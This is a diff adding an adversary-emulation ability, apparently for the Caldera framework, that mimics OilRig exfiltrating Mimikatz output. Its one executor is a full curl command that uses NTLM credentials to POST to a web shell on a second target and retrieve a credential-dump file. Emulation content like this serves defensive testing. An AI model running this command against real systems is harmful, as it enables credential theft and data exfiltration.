@@ -1,0 +1,31 @@
+ability_id: 845d36f1-13b6-4d42-a384-aa2f4af9bc27
+access: {}
+additional_info: {}
+buckets:
+- exfiltration
+delete_payload: true
+description: Exfiltrate the resulting output file to the attacker system
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}'
+    -k -X POST -o 01.txt --data 'don=c:\windows\temp\01.txt' https://#{second.target.ip}/EWS/contact.aspx
+  language: null
+  name: sh
+  parsers: []
+  payloads: []
+  platform: linux
+  timeout: 60
+  uploads: []
+  variations: []
+name: OilRig Exfiltrate Mimikatz Output (Kali Agent)
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: exfiltration
+technique_id: T1041
+technique_name: Exfiltration Over C2 Channel
